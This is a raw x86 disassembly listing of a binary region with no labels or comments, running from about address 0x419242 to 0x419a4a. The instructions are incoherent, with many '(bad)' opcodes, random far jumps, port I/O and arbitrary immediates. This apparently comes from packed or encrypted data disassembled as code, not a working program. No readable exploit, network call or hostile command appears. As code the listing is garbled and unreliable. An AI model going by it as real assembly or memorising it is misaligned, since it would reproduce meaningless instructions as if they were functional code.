  419242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419243:	jmp    0x419291
  419245:	fs (bad) 
  419247:	(bad)  
  419248:	cmp    esp,edi
  41924a:	and    ebx,DWORD PTR [ebp+0x1319d6ba]
  419250:	sbb    eax,0xf112bbac
  419255:	add    edi,DWORD PTR [ecx+0x5d]
  419258:	dec    esp
  419259:	pop    ebx
  41925a:	push   es
  41925b:	xor    eax,0x499b3e69
  419260:	das    
  419261:	jmp    0x68749014
  419266:	or     DWORD PTR [ebx+0x508281e9],ecx
  41926c:	or     esp,DWORD PTR [ecx]
  41926e:	icebp  
  41926f:	scas   al,BYTE PTR es:[edi]
  419270:	imul   BYTE PTR [ecx+0x2d71034d]
  419276:	ss scas eax,DWORD PTR es:[edi]
  419278:	int    0x56
  41927a:	cmp    eax,DWORD PTR [esi-0xc7d5601]
  419280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419281:	jbe    0x41921a
  419283:	out    0x18,al
  419285:	sbb    eax,DWORD PTR [esi-0x4cfedbf7]
  41928b:	int3   
  41928c:	shr    BYTE PTR [edi],0x72
  41928f:	or     edx,esp
  419291:	out    dx,al
  419292:	adc    cl,BYTE PTR [esi+0x57]
  419295:	int    0xb8
  419297:	sbb    BYTE PTR [edx+ebx*8],ah
  41929a:	pop    ss
  41929b:	sub    ebp,DWORD PTR [ebx+0x6005bbc9]
  4192a1:	xchg   edi,eax
  4192a2:	fs cli 
  4192a4:	and    DWORD PTR [ebp+0x1],esp
  4192a7:	xor    edx,DWORD PTR [ecx]
  4192a9:	push   eax
  4192aa:	push   cs
  4192ab:	mov    ah,0x75
  4192ad:	dec    esp
  4192ae:	push   0xd1a45cc0
  4192b3:	aaa    
  4192b4:	stos   BYTE PTR es:[edi],al
  4192b5:	icebp  
  4192b6:	mov    BYTE PTR [ecx+0x42644bf3],ch
  4192bc:	cmp    cl,al
  4192be:	or     DWORD PTR [esi-0x6dba2162],esi
  4192c4:	dec    esi
  4192c5:	adc    bh,ch
  4192c7:	xlat   BYTE PTR es:[ebx]
  4192c9:	xor    eax,0x805cac1d
  4192ce:	sar    BYTE PTR [ebx+0x5cd28061],cl
  4192d4:	nop
  4192d5:	push   edi
  4192d6:	cmp    DWORD PTR [eax],esi
  4192d8:	stos   BYTE PTR es:[edi],al
  4192d9:	hlt    
  4192da:	test   eax,0xe8119236
  4192df:	popa   
  4192e0:	pop    ecx
  4192e1:	out    0x1e,al
  4192e3:	jmp    0x51c6:0x4875a0be
  4192ea:	push   edi
  4192eb:	ds dec ecx
  4192ed:	fdiv   st(2),st
  4192ef:	jno    0x41928b
  4192f1:	pop    edi
  4192f2:	push   0xffffff93
  4192f4:	adc    dh,cl
  4192f6:	mov    ds,WORD PTR cs:[edx]
  4192f9:	lahf   
  4192fa:	and    al,0x39
  4192fc:	fiadd  DWORD PTR [ebx-0x28]
  4192ff:	mov    eax,ds:0x87485607
  419304:	ss pop esp
  419306:	cmp    eax,0x83afaba8
  41930b:	and    eax,0x377624c4
  419310:	aad    0x8a
  419312:	fcom   st(3)
  419314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419315:	add    edi,DWORD PTR [edx]
  419317:	and    BYTE PTR [eax-0x74],ah
  41931a:	cdq    
  41931b:	addr16 out dx,eax
  41931d:	mov    esp,0xba679212
  419322:	pop    ebp
  419323:	sub    ah,BYTE PTR [ecx+0x3f]
  419326:	fs cs iret 
  419329:	inc    eax
  41932a:	mov    bl,0xae
  41932c:	ret    
  41932d:	fild   WORD PTR [eax+eax*8+0x20]
  419331:	loope  0x41938b
  419333:	out    dx,al
  419334:	mov    ebp,0xdfa9bc6
  419339:	xchg   ebx,eax
  41933a:	push   ecx
  41933b:	into   
  41933c:	int3   
  41933d:	fs mov eax,0x84e2fe7
  419343:	mov    dl,BYTE PTR [ecx+0x3]
  419346:	(bad)  
  419347:	mov    cl,0xe
  419349:	sbb    al,0x5d
  41934b:	shl    DWORD PTR [ecx+0x5c],cl
  41934e:	pop    esp
  41934f:	es sub BYTE PTR fs:[esi],bl
  419353:	hlt    
  419354:	and    ebx,DWORD PTR [eax]
  419356:	push   0xb76100bc
  41935b:	fild   WORD PTR [ebx+0x21]
  41935e:	jne    0x4193c2
  419360:	clc    
  419361:	fs cmc 
  419363:	push   ebp
  419364:	xor    al,0xdd
  419366:	pop    ds
  419367:	push   ebp
  419368:	rcl    DWORD PTR [eax*2+0x5c370f9],1
  41936f:	mov    esi,esp
  419371:	test   eax,0xdf4ac4bc
  419376:	inc    edi
  419377:	mov    eax,ds:0x8efa0ea
  41937c:	sbb    BYTE PTR [edi],cl
  41937e:	bt     edx,esi
  419381:	leave  
  419382:	rcr    DWORD PTR gs:[ecx],cl
  419385:	push   ecx
  419386:	pop    eax
  419387:	mov    bl,0x3f
  419389:	push   0xebf6cd97
  41938e:	lods   al,BYTE PTR ds:[esi]
  41938f:	pushf  
  419390:	aaa    
  419391:	pop    ebp
  419392:	gs cmp dh,BYTE PTR cs:[eax]
  419396:	jno    0x419381
  419398:	lahf   
  419399:	loopne 0x4193ff
  41939b:	test   al,0xe9
  41939d:	fwait
  41939e:	jle    0x41934c
  4193a0:	arpl   WORD PTR [ecx+0x21],cx
  4193a3:	mov    bl,0xfe
  4193a5:	xchg   esi,eax
  4193a6:	mov    ch,0xd7
  4193a8:	mov    esi,0x78290813
  4193ad:	jmp    0xe74b4ed1
  4193b2:	jne    0x4193fe
  4193b4:	push   edx
  4193b5:	inc    ebx
  4193b6:	xchg   edi,eax
  4193b7:	dec    ecx
  4193b8:	cmp    ecx,DWORD PTR ds:0x6661defa
  4193be:	mov    dl,0x5e
  4193c0:	and    BYTE PTR [ecx+0x733594c6],al
  4193c6:	imul   edi,DWORD PTR [eax+0x377af278],0x5f28f7a9
  4193d0:	inc    esi
  4193d1:	push   edx
  4193d2:	push   edx
  4193d3:	es sti 
  4193d5:	push   eax
  4193d6:	jbe    0x419456
  4193d8:	pushf  
  4193d9:	mov    cl,0x44
  4193db:	push   esp
  4193dc:	jns    0x41941e
  4193de:	and    ecx,ecx
  4193e0:	and    eax,0xfdb68834
  4193e5:	leave  
  4193e6:	leave  
  4193e7:	xchg   edi,eax
  4193e8:	pusha  
  4193e9:	push   ebx
  4193ea:	ffreep st(1)
  4193ec:	and    DWORD PTR [ebx],esp
  4193ee:	fwait
  4193ef:	jo     0x4193ee
  4193f1:	and    al,0xbc
  4193f3:	ds inc edi
  4193f5:	jbe    0x419377
  4193f7:	lds    esi,FWORD PTR [ebx+0x73]
  4193fa:	call   0x38bbf6e0
  4193ff:	or     ch,BYTE PTR [edx]
  419401:	inc    esp
  419402:	push   ss
  419403:	enter  0xa790,0xdd
  419407:	inc    edi
  419408:	push   esi
  419409:	dec    edx
  41940a:	jo     0x41941a
  41940c:	inc    esp
  41940d:	push   edx
  41940e:	cmp    edx,DWORD PTR [ebx]
  419410:	(bad)  
  419411:	in     al,dx
  419412:	retf   
  419413:	jecxz  0x419428
  419415:	arpl   WORD PTR [eax+0x4c],di
  419418:	leave  
  419419:	cmp    al,0x4e
  41941b:	sbb    al,0x96
  41941d:	mov    eax,es:0x4a231ebf
  419423:	xchg   edx,eax
  419424:	xchg   esp,eax
  419425:	mov    esi,0x4e001af3
  41942a:	aad    0x75
  41942c:	jae    0x41941f
  41942e:	fimul  DWORD PTR [ecx]
  419430:	dec    ebx
  419431:	(bad)  
  419432:	and    DWORD PTR [ecx+0x5f],edi
  419435:	call   0xccc8db37
  41943a:	(bad)  
  41943b:	mov    dl,0x67
  41943d:	add    al,0xb4
  41943f:	dec    edx
  419440:	or     bh,cl
  419442:	inc    ecx
  419443:	sbb    dh,0x49
  419446:	inc    esp
  419447:	mov    edi,esi
  419449:	xchg   DWORD PTR [esi+0x27c7c946],edi
  41944f:	aas    
  419450:	jle    0x4194ad
  419452:	push   ecx
  419453:	pop    ds
  419454:	push   cs
  419455:	mov    al,0x57
  419457:	aas    
  419458:	push   esp
  419459:	jb     0x41941f
  41945b:	dec    ebp
  41945c:	stos   DWORD PTR es:[edi],eax
  41945d:	mov    dh,0xb1
  41945f:	mul    BYTE PTR [eax-0xecca13e]
  419465:	or     DWORD PTR [ecx+ebx*1-0x31146f52],0x47e4c5a2
  419470:	push   0xbb6947ff
  419475:	je     0x4194c0
  419477:	push   eax
  419478:	mov    ebx,0x340ce524
  41947d:	test   eax,0xc1dee53
  419482:	arpl   WORD PTR ds:0x95edd013,bx
  419488:	ja     0x4194cb
  41948a:	jae    0x41943e
  41948c:	aad    0x65
  41948e:	or     DWORD PTR es:[esi+edx*8-0x69],edi
  419493:	ja     0x41947f
  419495:	jmp    0xfcc0b55b
  41949a:	jge    0x419432
  41949c:	xor    eax,0x5fdbae96
  4194a1:	inc    eax
  4194a2:	and    al,0x8
  4194a4:	(bad)  
  4194a5:	call   FWORD PTR [edx]
  4194a7:	test   eax,0x2c8f3e3a
  4194ac:	mov    edi,0x8ace8bb6
  4194b1:	push   eax
  4194b2:	lock dec eax
  4194b4:	(bad)
  4194b9:	(bad)  
  4194ba:	xchg   esp,eax
  4194bb:	in     al,dx
  4194bc:	push   edi
  4194bd:	clc    
  4194be:	mov    eax,0xb3d4be07
  4194c3:	les    ebx,FWORD PTR [ecx+ebp*8]
  4194c6:	pop    esp
  4194c7:	ins    DWORD PTR es:[edi],dx
  4194c8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4194ca:	sbb    esp,esp
  4194cc:	xor    ebx,edx
  4194ce:	pcmpgtb mm3,QWORD PTR [edi+0x25]
  4194d2:	add    eax,0x37457913
  4194d7:	or     bh,BYTE PTR [esi]
  4194d9:	jle    0x419520
  4194db:	das    
  4194dc:	mov    al,ds:0x30efe409
  4194e1:	daa    
  4194e2:	jg     0x419529
  4194e4:	xchg   edx,eax
  4194e5:	mov    esp,0x84001c5b
  4194ea:	push   edx
  4194eb:	adc    dh,ah
  4194ed:	jecxz  0x4194be
  4194ef:	or     bl,BYTE PTR [ecx+0x654d1395]
  4194f5:	or     eax,0x2e4d0782
  4194fa:	(bad)  
  4194fb:	mov    eax,0xc66bee10
  419500:	(bad)  
  419501:	xor    BYTE PTR [eax],bh
  419503:	addr16 xchg ebx,eax
  419505:	int    0x1b
  419507:	lahf   
  419508:	(bad)  
  419509:	and    ebx,DWORD PTR [ecx]
  41950b:	scas   eax,DWORD PTR es:[edi]
  41950c:	jo     0x419508
  41950e:	stos   DWORD PTR es:[edi],eax
  41950f:	mov    esi,0x197883a9
  419514:	dec    eax
  419515:	lea    ebp,[ebx+0x249aef49]
  41951b:	push   edi
  41951c:	not    BYTE PTR [ecx]
  41951e:	inc    esp
  41951f:	fidiv  WORD PTR [edi+0x4c]
  419522:	lea    ecx,[eax*1-0x60653c32]
  419529:	push   ds
  41952a:	cmp    ebp,DWORD PTR [edi-0x41ba3c7a]
  419530:	jne    0x41959b
  419532:	mov    esp,0x78ec9dc6
  419537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419538:	mov    ch,0xf8
  41953a:	ds fwait
  41953c:	ror    DWORD PTR ds:0xa8d48378,0xda
  419543:	adc    al,BYTE PTR [edx+ebx*2+0x10]
  419547:	imul   ebx,eax,0xaede0480
  41954d:	mov    esi,DWORD PTR [ebp-0x68]
  419550:	outs   dx,DWORD PTR ds:[esi]
  419551:	push   edx
  419552:	inc    esi
  419553:	je     0x41950e
  419555:	dec    edx
  419556:	jbe    0x41952b
  419558:	jnp    0x4195ac
  41955a:	or     al,0x5d
  41955c:	adc    BYTE PTR [edi-0x5dac43f0],ah
  419562:	or     dl,BYTE PTR [eax-0x73]
  419565:	jmp    0xd5fd:0x6ad8d024
  41956c:	mov    ch,0xd2
  41956e:	out    0xdf,eax
  419570:	mov    ds:0x19e6b05f,eax
  419575:	push   ecx
  419576:	loopne 0x41956d
  419578:	in     al,dx
  419579:	inc    esp
  41957a:	addr16 mov ch,0xdc
  41957d:	gs icebp 
  41957f:	cmp    cl,BYTE PTR [edx-0x5f03d712]
  419585:	mov    bl,0x1c
  419587:	fisub  DWORD PTR [ecx]
  419589:	sub    al,0x94
  41958b:	jmp    0x9005:0x39b84212
  419592:	cmp    eax,DWORD PTR [ebx+0x58]
  419595:	push   esp
  419596:	pop    ebp
  419597:	dec    ebp
  419598:	add    BYTE PTR [edx+edx*8+0x40],dh
  41959c:	dec    eax
  41959d:	cs enter 0x519b,0x80
  4195a2:	test   DWORD PTR [edi-0x32],0x59ed78c9
  4195a9:	pop    esp
  4195aa:	(bad)  
  4195ab:	or     DWORD PTR [eax],eax
  4195ad:	jns    0x4195db
  4195af:	sbb    eax,0xee165add
  4195b4:	(bad)  
  4195b5:	lods   al,BYTE PTR ds:[esi]
  4195b6:	aaa    
  4195b7:	test   edx,edx
  4195b9:	out    0xc0,al
  4195bb:	push   ecx
  4195bc:	ret    
  4195bd:	fcmovb st,st(2)
  4195bf:	xchg   DWORD PTR [edi-0x723a8b79],edi
  4195c5:	rol    DWORD PTR [ebp+0x2d],1
  4195c8:	sub    ch,BYTE PTR [esi-0x38]
  4195cb:	mov    dh,0xe7
  4195cd:	test   BYTE PTR [edx],0x3b
  4195d0:	pop    eax
  4195d1:	jg     0x41964b
  4195d3:	test   BYTE PTR [ecx-0x4f],0xb6
  4195d7:	int    0x44
  4195d9:	jbe    0x4195a7
  4195db:	mov    dl,0x4c
  4195dd:	rcr    edi,cl
  4195df:	xchg   ebp,eax
  4195e0:	mov    esi,0x3eeedb74
  4195e5:	push   0xfffffff8
  4195e7:	jno    0x4195af
  4195e9:	cmc    
  4195ea:	fwait
  4195eb:	push   cs
  4195ec:	sbb    al,BYTE PTR [ebx+0x47]
  4195ef:	and    eax,0xc07c8471
  4195f4:	mov    WORD PTR ds:0x3f3c1b4d,cs
  4195fa:	inc    ebp
  4195fb:	cli    
  4195fc:	jg     0x419617
  4195fe:	dec    ebx
  4195ff:	cmp    DWORD PTR gs:[eax-0x4cf6596d],0x259f198
  41960a:	dec    eax
  41960b:	lds    edx,FWORD PTR [ebp+0x44]
  41960e:	hlt    
  41960f:	mov    eax,ds:0x59893d24
  419614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419615:	test   dl,ah
  419617:	retf   0x7bbd
  41961a:	popa   
  41961b:	call   DWORD PTR [ecx]
  41961d:	push   es
  41961e:	call   0x3a2a74d0
  419623:	outs   dx,BYTE PTR ds:[esi]
  419624:	jmp    0x93584fab
  419629:	out    dx,eax
  41962a:	int3   
  41962b:	repnz daa 
  41962d:	or     esi,edx
  41962f:	push   ebp
  419630:	mov    ds:0xdc500063,eax
  419635:	or     eax,0x819840c5
  41963a:	sbb    bh,ch
  41963c:	out    dx,eax
  41963d:	mov    edi,0x84f99d94
  419642:	or     ah,al
  419644:	ret    
  419645:	xchg   ecx,eax
  419646:	call   0x77dad7c2
  41964b:	jmp    0x419622
  41964d:	dec    edx
  41964e:	ret    
  41964f:	mov    ecx,0x4118e331
  419654:	xchg   ebp,eax
  419655:	je     0x41a17f
  41965b:	push   DWORD PTR [ebp+0x20]
  41965e:	push   DWORD PTR [ebp+0x1c]
  419661:	push   DWORD PTR [ebp+0x18]
  419664:	jmp    0x419bee
  419669:	mov    cl,bh
  41966b:	push   eax
  41966c:	inc    ax
  41966e:	push   ds
  41966f:	sbb    al,bl
  419671:	add    bl,BYTE PTR [esi-0x13]
  419674:	mov    ah,0x89
  419676:	add    dl,BYTE PTR [eax+ebp*4]
  419679:	jmp    0x1604:0x3d160c45
  419680:	push   ss
  419681:	adc    DWORD PTR [ecx],ecx
  419683:	jmp    0x887e:0x627c2d1f
  41968a:	push   0x433488d
  41968f:	mov    dh,BYTE PTR [ecx]
  419691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419692:	outs   dx,BYTE PTR ds:[esi]
  419693:	lock out dx,al
  419695:	pop    es
  419696:	btc    DWORD PTR [edx-0x4960e0e7],ebx
  41969d:	lahf   
  41969e:	mov    cl,0x39
  4196a0:	mov    edi,0x4d280c5a
  4196a5:	cmp    eax,0xfff2badf
  4196aa:	sbb    edx,esp
  4196ac:	repnz aam 0xec
  4196af:	(bad)  [ecx+0x2a5145ad]
  4196b5:	neg    DWORD PTR [edx-0x30]
  4196b8:	(bad)  
  4196b9:	mov    al,0xda
  4196bb:	pop    esi
  4196bc:	call   0x7424978b
  4196c1:	gs xchg edi,eax
  4196c3:	sub    BYTE PTR [ebp-0x20],dh
  4196c6:	xchg   esp,eax
  4196c7:	bound  eax,QWORD PTR [ecx-0x69]
  4196ca:	add    al,0x8
  4196cc:	out    0x4d,al
  4196ce:	call   edx
  4196d0:	cmp    dh,BYTE PTR [eax-0xa]
  4196d3:	sbb    al,0xba
  4196d5:	sar    bl,0x6c
  4196d8:	and    dl,BYTE PTR [ecx-0x173c8e49]
  4196de:	pop    edi
  4196df:	lock pop ebx
  4196e1:	pusha  
  4196e2:	les    ebp,FWORD PTR ds:0x7dceb99
  4196e8:	rcl    BYTE PTR [ebp-0x5550f953],1
  4196ee:	mov    ?,WORD PTR [eax+0x42]
  4196f1:	mov    al,0x41
  4196f3:	call   0xd40e:0x62974d79
  4196fa:	sbb    BYTE PTR [eax-0x72],0xcd
  4196fe:	mov    eax,0x63bda878
  419703:	out    0xc6,eax
  419705:	add    eax,DWORD PTR [edx]
  419707:	push   esi
  419708:	sahf   
  419709:	adc    al,0x3f
  41970b:	mov    es,WORD PTR [ebp+0x3d]
  41970e:	ss gs push esi
  419711:	push   eax
  419712:	fadd   DWORD PTR [ebp-0x11cfe2a6]
  419718:	mov    WORD PTR [edx+0x3ed13f72],?
  41971e:	mov    al,0xd3
  419720:	adc    BYTE PTR [ebx+0x56],dh
  419723:	stc    
  419724:	mov    bl,BYTE PTR [esp+edx*1-0x52]
  419728:	pusha  
  419729:	(bad)  
  41972a:	(bad)  
  41972b:	lods   al,BYTE PTR ds:[esi]
  41972c:	mov    ah,0xe0
  41972e:	pop    ecx
  41972f:	ins    DWORD PTR es:[edi],dx
  419730:	call   0x8a7779d3
  419735:	or     eax,edx
  419737:	mov    eax,ds:0x5bd7713c
  41973c:	lods   al,BYTE PTR ds:[esi]
  41973d:	mov    ?,WORD PTR [edx]
  41973f:	pop    esp
  419740:	test   BYTE PTR cs:[esi],bl
  419743:	ret    
  419744:	xchg   ebx,eax
  419745:	out    dx,al
  419746:	sbb    dl,dl
  419748:	test   al,0x64
  41974a:	adc    DWORD PTR [edx],ebx
  41974c:	mov    DWORD PTR ds:0x17e5feec,0x932a13
  419756:	pop    esi
  419757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419758:	ja     0x419757
  41975a:	adc    cl,BYTE PTR [ebp-0x3d]
  41975d:	jae    0x4196ef
  41975f:	add    dl,BYTE PTR [ebp+0x22fc8aa8]
  419765:	jecxz  0x419753
  419767:	(bad)  
  419768:	sub    DWORD PTR [esi],edx
  41976a:	fwait
  41976b:	lods   al,BYTE PTR ds:[esi]
  41976c:	es dec eax
  41976e:	shr    edx,1
  419770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419771:	jb     0x419767
  419773:	mov    bh,0x71
  419775:	ror    DWORD PTR [ecx+0x77],cl
  419778:	pop    ecx
  419779:	scas   al,BYTE PTR es:[edi]
  41977a:	repz (bad) 
  41977c:	xchg   esp,eax
  41977d:	lds    esp,FWORD PTR [ecx-0x59]
  419780:	sbb    BYTE PTR [esi-0x115b4d50],dh
  419786:	sbb    al,0x34
  419788:	out    0x47,al
  41978a:	shl    DWORD PTR [edx-0x5e19d342],1
  419790:	push   eax
  419791:	or     eax,0x9cd9f9e8
  419796:	jno    0x419721
  419798:	addr16 mov dl,0x98
  41979b:	test   al,0xb1
  41979d:	js     0x4197da
  41979f:	and    DWORD PTR [ecx],edi
  4197a1:	xlat   BYTE PTR ds:[ebx]
  4197a2:	mov    eax,ds:0x13e989e3
  4197a7:	adc    ebp,DWORD PTR [edi+ebp*2]
  4197aa:	jp     0x419747
  4197ac:	mov    ?,edx
  4197ae:	inc    eax
  4197af:	lds    edx,FWORD PTR ds:0x2cd2fd54
  4197b5:	jp     0x419743
  4197b7:	mov    eax,DWORD PTR [ebp+0x42dd7bed]
  4197bd:	test   eax,0xa901da81
  4197c2:	in     eax,dx
  4197c3:	test   eax,esi
  4197c5:	and    al,0x56
  4197c7:	mov    ch,BYTE PTR [edi+0x45]
  4197ca:	mov    ah,0xec
  4197cc:	pop    edx
  4197cd:	repnz sub al,al
  4197d0:	out    dx,eax
  4197d1:	mov    bh,0x9e
  4197d3:	fadd   DWORD PTR [ecx+eiz*1]
  4197d6:	jno    0x4197c5
  4197d8:	mov    bh,dl
  4197da:	sti    
  4197db:	add    eax,0xa35f9388
  4197e0:	stos   BYTE PTR es:[edi],al
  4197e1:	pop    ds
  4197e2:	nop
  4197e3:	loopne 0x419803
  4197e5:	aas    
  4197e6:	enter  0x7441,0x6
  4197ea:	pop    ebp
  4197eb:	jnp    0x4197aa
  4197ed:	mov    eax,ds:0xb0a23a7e
  4197f2:	stc    
  4197f3:	rcr    DWORD PTR [edx+0x4f86baea],0x55
  4197fa:	or     al,0x9e
  4197fc:	into   
  4197fd:	leave  
  4197fe:	mov    ds:0x68d860da,eax
  419803:	mov    esi,0xe73a4d1e
  419808:	mov    esi,0xe289c4ed
  41980d:	sbb    eax,0x3aec6d5d
  419812:	aas    
  419813:	fimul  DWORD PTR [ebx+0x3568d393]
  419819:	setb   ah
  41981c:	adc    bh,ah
  41981e:	js     0x4197a4
  419820:	call   0x3379:0xeaf37053
  419827:	xchg   ebp,eax
  419828:	cmp    cl,BYTE PTR [ebp+0x4198b1d0]
  41982e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41982f:	sbb    BYTE PTR [esi+ebp*8-0x5f],dl
  419833:	add    al,0x20
  419835:	in     eax,0x44
  419837:	aam    0x19
  419839:	stos   DWORD PTR es:[edi],eax
  41983a:	fdivr  QWORD PTR [ebx]
  41983c:	mov    ebx,0x9f373528
  419841:	jmp    0xb4a6:0x640d1550
  419848:	stos   BYTE PTR es:[edi],al
  419849:	inc    edx
  41984a:	fnstcw WORD PTR [ebx-0x328dde51]
  419850:	xchg   BYTE PTR [ecx-0x1d487155],cl
  419856:	cld    
  419857:	dec    edi
  419858:	and    al,0xf6
  41985a:	lods   eax,DWORD PTR ds:[esi]
  41985b:	aam    0x92
  41985d:	shr    BYTE PTR [esi-0x363abe2d],cl
  419863:	xor    al,0xf4
  419865:	(bad)  
  419866:	mov    cl,0x2d
  419868:	and    edx,eax
  41986a:	cmp    BYTE PTR [bp+si],dl
  41986d:	cmc    
  41986e:	sub    edi,DWORD PTR [edi-0xf]
  419871:	scas   al,BYTE PTR es:[edi]
  419872:	xchg   BYTE PTR [ebx+0x4f],dl
  419875:	and    al,0x50
  419877:	in     eax,0xaa
  419879:	bound  esp,QWORD PTR [eax]
  41987b:	outs   dx,DWORD PTR ds:[esi]
  41987c:	sti    
  41987d:	or     BYTE PTR [edx],0x7c
  419880:	aam    0x3a
  419882:	cld    
  419883:	mov    DWORD PTR ss:[ecx],edi
  419886:	and    dh,BYTE PTR [esi+0x3a]
  419889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41988a:	(bad)  
  41988b:	(bad)  
  41988d:	ins    BYTE PTR es:[edi],dx
  41988e:	cli    
  41988f:	add    BYTE PTR [edx-0x6f],bl
  419892:	test   eax,0xb80980f7
  419897:	sbb    bh,BYTE PTR [esi-0x5ce80936]
  41989d:	outs   dx,BYTE PTR ds:[esi]
  41989e:	shl    BYTE PTR [ebx],1
  4198a0:	ror    BYTE PTR [esi+0x628f09c0],cl
  4198a6:	and    bl,ch
  4198a8:	call   0x6839805
  4198ad:	adc    BYTE PTR ds:0x3ee38e4e,ah
  4198b3:	sub    ch,BYTE PTR [ebp-0x3c245e26]
  4198b9:	cli    
  4198ba:	and    eax,0x34495a21
  4198bf:	xchg   edi,eax
  4198c0:	adc    eax,esi
  4198c2:	fdivr  st,st(1)
  4198c4:	das    
  4198c5:	imul   DWORD PTR [edx]
  4198c7:	cdq    
  4198c8:	mov    eax,ds:0xf719784e
  4198cd:	loopne 0x4198f5
  4198cf:	sub    al,0xff
  4198d1:	sub    eax,0x8b99445b
  4198d6:	mov    es,WORD PTR [ebp+0x60]
  4198d9:	and    BYTE PTR [ebx-0x40],0x1
  4198dd:	xor    al,0x4f
  4198df:	jns    0x41986e
  4198e1:	(bad)  
  4198e2:	jns    0x41995b
  4198e4:	fwait
  4198e5:	pop    esi
  4198e6:	femms  
  4198e8:	outs   dx,BYTE PTR ds:[esi]
  4198e9:	pop    ecx
  4198ea:	add    eax,0xdc7662c3
  4198ef:	test   al,0x85
  4198f1:	(bad)  
  4198f2:	mov    ds:0x9df9400,eax
  4198f7:	imul   esp,DWORD PTR [edx+0x59776047],0xccf0477e
  419901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419902:	icebp  
  419903:	mov    edi,0x25d9bc30
  419908:	scas   al,BYTE PTR es:[edi]
  419909:	jl     0x41996b
  41990b:	jecxz  0x419945
  41990d:	fidiv  WORD PTR [ebx]
  41990f:	dec    ecx
  419910:	ds in  al,dx
  419912:	dec    edx
  419913:	push   es
  419914:	sar    eax,0x65
  419917:	add    ebp,ebx
  419919:	fiadd  DWORD PTR [edx-0x3d7a769b]
  41991f:	dec    esp
  419920:	sub    cl,ch
  419922:	mov    ecx,0x29228fcf
  419927:	lods   eax,DWORD PTR ds:[esi]
  419928:	dec    ecx
  419929:	adc    esp,DWORD PTR [edx]
  41992b:	imul   ecx,edx,0xffffff91
  41992e:	cmp    al,0x3
  419930:	xor    al,0x86
  419932:	ror    cl,0x53
  419935:	adc    DWORD PTR [edx-0x6421b942],ebp
  41993b:	icebp  
  41993c:	outs   dx,DWORD PTR ds:[esi]
  41993d:	push   ebx
  41993e:	pushf  
  41993f:	out    dx,eax
  419940:	mov    ebx,DWORD PTR [esi+esi*2]
  419943:	fidiv  DWORD PTR [ebx]
  419945:	lock jl 0x4198e7
  419948:	inc    esi
  419949:	push   cs
  41994a:	mov    ecx,0xfdb9e81a
  41994f:	ss out 0x9,al
  419952:	dec    ebp
  419953:	cmc    
  419954:	cdq    
  419955:	sub    bh,BYTE PTR [edx+edx*2+0x44b474fb]
  41995c:	stos   DWORD PTR es:[edi],eax
  41995d:	adc    DWORD PTR [esi],esi
  41995f:	pop    ecx
  419960:	mov    al,ds:0xf3764bd9
  419965:	mov    cl,0x67
  419967:	(bad)
  41996a:	fistp  QWORD PTR [ecx-0x588c843e]
  419970:	out    0x4b,eax
  419972:	cmp    dh,BYTE PTR [eax-0x2a4b1642]
  419978:	imul   dl
  41997a:	push   esi
  41997b:	ficomp WORD PTR [eax-0x3ca5e77]
  419981:	add    al,0xf5
  419983:	les    ecx,FWORD PTR [edx+ebp*2+0x1f70b716]
  41998a:	mov    eax,0x1c298619
  41998f:	cli    
  419990:	mov    edx,0xc5f3f1f1
  419995:	nop
  419996:	sbb    edi,ebx
  419998:	xchg   DWORD PTR [ebp+0x73],edi
  41999b:	pop    ss
  41999c:	jbe    0x4199ba
  41999e:	dec    edi
  41999f:	aam    0x2a
  4199a1:	test   al,0xb2
  4199a3:	es dec ebp
  4199a5:	mov    ebp,0xa921832e
  4199aa:	inc    eax
  4199ab:	addr16 cwde 
  4199ad:	xchg   DWORD PTR [ebp-0x58],esp
  4199b0:	stc    
  4199b1:	cmp    al,0x77
  4199b3:	xor    eax,0xa76280c9
  4199b8:	push   edx
  4199b9:	inc    eax
  4199ba:	or     al,0x46
  4199bc:	jl     0x419a11
  4199be:	fimul  DWORD PTR [esi+eax*2+0x2ae471ce]
  4199c5:	inc    edi
  4199c6:	sbb    al,0xb3
  4199c8:	rol    BYTE PTR [esi+0x1c7d1342],cl
  4199ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199cf:	mov    ebp,0x9348d9df
  4199d4:	outs   dx,BYTE PTR ds:[esi]
  4199d5:	xchg   esi,eax
  4199d6:	mov    ecx,0x9f74f664
  4199db:	out    dx,al
  4199dc:	(bad)  
  4199dd:	fs sub al,0xcf
  4199e0:	mov    ds:0x4a10b8b0,eax
  4199e5:	pop    DWORD PTR [ebp-0x80]
  4199e8:	dec    ebx
  4199e9:	inc    ecx
  4199ea:	cdq    
  4199eb:	daa    
  4199ec:	xchg   ecx,eax
  4199ed:	sbb    DWORD PTR [ecx-0x4ae16ba9],0x86606163
  4199f7:	jno    0x419a2b
  4199f9:	xchg   DWORD PTR [ebx+0x733b4c48],edx
  4199ff:	jo     0x419a0f
  419a01:	frstor [ebp-0x1405b63a]
  419a07:	mov    esp,0xbc7d2a1
  419a0c:	std    
  419a0d:	cmp    bh,BYTE PTR [edi+0x62bdf8f8]
  419a13:	aaa    
  419a14:	lods   al,BYTE PTR ds:[esi]
  419a15:	sti    
  419a16:	lock mov eax,ds:0x84d2cea4
  419a1c:	xchg   eax,ecx
  419a1e:	std    
  419a1f:	lds    edi,FWORD PTR [ebx-0xa3e6315]
  419a25:	add    dl,dh
  419a27:	xchg   esp,eax
  419a28:	fbld   TBYTE PTR [ebp+ebx*1-0x798c8b48]
  419a2f:	jecxz  0x419a04
  419a31:	hlt    
  419a32:	bnd jb 0x419ab2
  419a35:	sub    eax,eax
  419a37:	add    al,0xb9
  419a39:	nop
  419a3a:	out    dx,al
  419a3b:	jnp    0x419a86
  419a3d:	bound  ebp,QWORD PTR [ecx]
  419a3f:	int    0x31
  419a41:	imul   ebx,DWORD PTR [edx-0x75092e74],0xffffffe5
  419a48:	inc    edi
  419a49:	(bad)  
  419a4a:	in     al,dx
